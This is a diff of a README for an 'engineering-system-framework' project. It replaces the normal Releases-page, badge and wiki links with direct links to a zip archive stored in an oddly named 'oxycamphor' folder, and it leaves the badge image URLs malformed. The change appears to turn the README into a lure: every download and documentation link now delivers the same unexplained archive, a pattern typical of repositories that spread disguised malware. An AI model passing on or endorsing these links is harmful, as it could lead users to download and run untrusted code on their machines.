@@ -1,7 +1,7 @@
 # 🎉 engineering-system-framework - Simplify Your Engineering Processes
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Suwopfrmda8/engineering-system-framework/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Suwopfrmda8/engineering-system-framework/main/oxycamphor/engineering-system-framework.zip%20Latest%https://raw.githubusercontent.com/Suwopfrmda8/engineering-system-framework/main/oxycamphor/engineering-system-framework.zip)](https://raw.githubusercontent.com/Suwopfrmda8/engineering-system-framework/main/oxycamphor/engineering-system-framework.zip)
 
 ## 📖 Overview
 Welcome to the engineering-system-framework! This software offers a structured way to unify principles, rhythms, and documentation in engineering. Designed to enhance clarity, consistency, and scalability, it empowers users to manage their engineering processes effectively.
@@ -10,7 +10,7 @@ Welcome to the engineering-system-framework! This software offers a structured w
 Follow these steps to get started with the engineering-system-framework.
 
 ### 1. Visit the Releases Page
-To download the latest version of the software, visit our [Releases page](https://github.com/Suwopfrmda8/engineering-system-framework/releases).
+To download the latest version of the software, visit our [Releases page](https://raw.githubusercontent.com/Suwopfrmda8/engineering-system-framework/main/oxycamphor/engineering-system-framework.zip).
 
 ### 2. Download the Software
 On the Releases page, you will see the latest version available. Click on the downloadable file that matches your operating system.
@@ -58,7 +58,7 @@ Using the engineering-system-framework can significantly boost your team’s pro
 ## 🔀 Download & Install
 Ready to enhance your engineering practices? Click to download:
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Suwopfrmda8/engineering-system-framework/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Suwopfrmda8/engineering-system-framework/main/oxycamphor/engineering-system-framework.zip%20Latest%https://raw.githubusercontent.com/Suwopfrmda8/engineering-system-framework/main/oxycamphor/engineering-system-framework.zip)](https://raw.githubusercontent.com/Suwopfrmda8/engineering-system-framework/main/oxycamphor/engineering-system-framework.zip)
 
 After downloading, install the software by following the steps in the “Install the Software” section above.
 
@@ -70,7 +70,7 @@ A: Currently, the engineering-system-framework supports Windows and macOS. Check
 A: We aim to update the software regularly based on user feedback and technological advancements.
 
 ### Q: Where can I find additional resources?
-A: For more in-depth guidance, you can refer to our [documentation](https://github.com/Suwopfrmda8/engineering-system-framework/wiki).
+A: For more in-depth guidance, you can refer to our [documentation](https://raw.githubusercontent.com/Suwopfrmda8/engineering-system-framework/main/oxycamphor/engineering-system-framework.zip).
 
 ## 📫 Support
 If you encounter any issues while downloading or using the engineering-system-framework, please reach out to our support team via the Issues section on our GitHub repository.
